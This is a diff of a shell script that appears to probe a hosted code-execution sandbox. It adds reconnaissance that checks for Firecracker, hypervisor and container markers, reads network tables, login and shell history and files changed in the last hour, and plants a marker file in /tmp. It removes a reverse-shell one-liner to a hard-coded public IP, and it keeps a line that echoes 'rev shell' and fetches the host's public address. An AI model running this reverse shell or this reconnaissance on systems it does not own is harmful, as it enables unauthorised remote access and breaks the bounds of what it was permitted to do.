@@ -63,12 +63,38 @@ echo "rev shell"
 echo "ip public"
 echo $(curl ifconfig.me)
 
-# Source - https://stackoverflow.com/a/39901446
-# Posted by Farhad Farahi, modified by community. See post 'Timeline' for change history
-# Retrieved 2026-07-08, License - CC BY-SA 4.0
+echo "infos firecracker"
+echo "--------------------------------"
+dmesg | grep -i firecracker
+cat /sys/class/dmi/id/product_name
+cat /proc/cpuinfo | grep hypervisor
+lscpu | grep -i hypervisor
+uname -r 
+cat /proc/version
+ls -la /dev/
+lsblk 
 
-apt-get update -y
-apt-get install -y iputils-ping
-ping 54.73.133.183
-sh -i >& /dev/tcp/54.73.133.183/9001 0>&1
+
+cat /proc/1/cgroup
+systemd-detect-virt -c
+cat /.dockerenv 2>/dev/null
+cat /proc/self/mountinfo | grep -i overlayfs
+readlink /proc/self/ns/* 
+
+echo "test cleaness"
+who 
+last 
+find / -newermt '-1 hour' 2>/dev/null
+echo "ls tmp"
+ls -la /tmp
+ls -la /tmp | grep TMP_HOMEMADE
+echo "ls home"
+ls -la /home 
+echo "touch tmp"
+touch /tmp/TMP_HOMEMADE
+echo "history"
+history 
+
+cat /proc/net/*
+cat /proc/sys/kernel/random/boot_id
 exit 0
